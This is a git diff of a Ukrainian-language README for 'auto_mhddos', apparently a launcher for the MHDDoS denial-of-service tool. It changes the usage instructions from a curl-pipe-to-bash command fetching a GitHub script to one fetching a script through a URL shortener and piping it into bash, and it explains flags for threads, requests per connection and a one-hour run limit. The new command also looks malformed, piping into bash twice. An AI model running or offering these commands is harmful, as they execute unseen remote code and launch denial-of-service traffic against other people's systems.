@@ -38,20 +38,19 @@ curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_b
 ```
 
 
-<details>
-  <summary>Передача параметрів (тимчасово не працює)</summary>
+## !Передача параметрів
 ```
-curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/bash/auto_bash.sh | bash -s -- -t 2000 --rpc 2000 -k 1 --table
+curl -L tiny.one/autobash-test | bash -s -- -t 50 -r 50 -k 1 --table | bash -s -- -t 1000 -r 2000 -k 1 --table
 ```
 
-`-t 2000` - 2000 тредів
+`-t 1000` - 1000 тредів
 
 `--rpc 2000` - 2000 rpc
 
 `-k 1` - kill 1 hour. Завершити скрипт через 1 годину роботи
 
 `--table` - увімкнути режим відображення данних в таблиці
-</details>
+
 
 ## Зупинка скрипту
 
